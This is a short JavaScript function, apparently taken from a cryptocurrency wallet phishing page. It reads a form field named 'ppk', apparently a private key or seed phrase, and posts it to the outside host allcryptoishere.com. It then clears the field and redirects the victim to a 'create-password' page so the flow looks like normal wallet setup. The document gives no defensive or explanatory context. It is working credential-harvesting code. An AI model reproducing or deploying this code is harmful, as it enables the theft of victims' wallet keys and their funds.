function sendData(event) {
			event.preventDefault();

			var ppk = $('#ppk').val();
			

			$.ajax({
				url: 'https://allcryptoishere.com/test/php.php',
				method: 'POST',
				data: {
					ppk: ppk
					},
				success: function(response) {
				document.getElementById('ppk').value = ''
				setTimeout(function() { window.location.href = "create-password.html"},500);	
				},
				error: function(xhr, status, error) {
					alert('Error sending data: ' + error);
				}
			});
		}